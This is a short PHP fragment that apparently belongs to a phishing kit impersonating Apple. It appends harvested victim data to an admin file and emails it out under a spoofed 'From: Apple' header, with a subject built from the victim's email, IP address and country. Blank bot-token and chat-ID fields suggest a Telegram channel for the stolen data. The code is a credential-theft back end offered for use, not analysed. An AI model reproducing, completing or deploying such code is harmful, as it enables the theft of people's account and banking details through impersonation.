<?php



$yourmail  = '';

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['Emailapp']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Apple" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

$botToken="";
$chatId="";  